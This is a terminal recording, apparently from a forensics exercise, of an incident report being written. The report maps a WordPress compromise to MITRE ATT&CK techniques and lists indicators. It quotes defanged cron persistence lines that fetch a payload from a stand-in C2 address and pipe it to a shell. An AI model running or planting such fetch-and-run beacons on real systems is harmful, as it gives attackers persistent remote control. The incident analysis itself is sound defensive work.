[606.325868, "o", "## 2. Attack Chain & MITRE ATT&CK Mapping"]
[606.325923, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[606.325977, "o", "\u001b[?2004h> "]
[606.326129, "o", "### Step 1: Initial Access (T1190 - Exploit Public-Facing Application)\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.326215, "o", "> "]
[606.326439, "o", "- **Activity:** Attacker probed web application and executed code via POST requests (`/disk/var/log/nginx/access.log:297`, `/sas/vulns.json:2`)."]
[606.326476, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.326585, "o", "- **Alert Status:** Covered by ALERT-01 (`/sas/alerts.json:4`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[606.326603, "o", "\u001b[?2004h"]
[606.326696, "o", "> "]
[606.326734, "o", "### Step 2: Web Shell Persistence (T1505.003 - Web Shell)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.327044, "o", "- **Activity:** Attacker accessed PHP backdoor at `/var/www/html/wp-content/plugins/contact/inc.php` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1-5`)."]
[606.32708, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.327166, "o", "- **Alert Status:** Covered by ALERT-01 (`/sas/alerts.json:4`)."]
[606.327202, "o", "\r\n\u001b[?2004l\r\u001b[?2004h"]
[606.327237, "o", "> "]
[606.327253, "o", "\r\n"]
[606.327345, "o", "\u001b[?2004l\r\u001b[?2004h> "]
[606.327514, "o", "### Step 3: Scheduled Task Persistence (T1053.003 - Scheduled Task/Job: Cron)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.327959, "o", "- **Activity:** Attacker established dual crontab persistence for `www-data` and `root`:\r\n\u001b[?2004l\rest to `"]
[606.327967, "o", "\u001b[?2004h>   - `www-data` crontab: `/disk/var/spool/cron/crontabs/www-data:2` (`# * * * * www-data <defanged beacon: curl hxxp://198.51.100.40/payload.sh | bash>`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.328132, "o", "  - `root` crontab: `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[606.329963, "o", "- **Alert Status:** **SILENT / UNALERTED** (Omitted from `/sas/alerts.json`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 4: Command and Control (T1071.001 - Web Protocols)\r\n\u001b[?2004l\r\u001b[?2004h> - **Activity:** Crontabs continuously initiate outbound HTTP sessions to C2 infrastructure (`198.51.100.40` and `update-wordpress.example.cn`) (`/disk/var/spool/cron/crontabs/www-data:2`, `/disk/etc/crontab:5`, `/sas/cti/advisory.txt:18`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\rl\u001b[?2004h> ### Step 5: Traffic Redirection (T1505.003 / Redirection)\r\n\u001b[?2004l\r\u001b[?2004h> - **Activity:** Attacker added rewrite rules in `/var/www/html/.htaccess` (`/disk/var/www/html/.htaccess:2`):\r\n\u001b[?2004l\r\u001b[?2004h>   `.htaccess RewriteRule redirect of all traffic to 198.51.100.40 (pharma)`\r\n\u001b[?2004l\r\u001b[?2004h> - **Alert Status:** **SILENT / UNALERTED** (Omitted from `/sas/alerts.json`).\r\n\u001b[?2004l\r Quar\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 6: Site Defacement (T1491.001 - Internal Defacement)\r\n\u001b[?2004l\r\u001b[?2004h> - **Activity:** Created defacement landing page `/var/www/html/index.html` (`/disk/var/www/html/index.html:1-4`).\r\n\u001b[?2004l\rci\u001b[?2004h> - **Alert Status:** Covered by ALERT-02 (`/sas/alerts.json:11`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r \u001b[?2004h> ---\r\n\u001b[?2004l\rto u\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## 3. Threat Entity & Indicator Inventory\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> | Type | Value | Role | Citation |\r\n\u001b[?2004l\r\u001b[?2004h> |---|---|---|---|\r\n\u001b[?2004l\r\u001b[?2004h> | Origin IP | `198.51.100.40` | Source of exploit POSTs & C2 server | `/sas/cti/advisory.txt:4`, `/disk/var/log/nginx/access.log:297` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
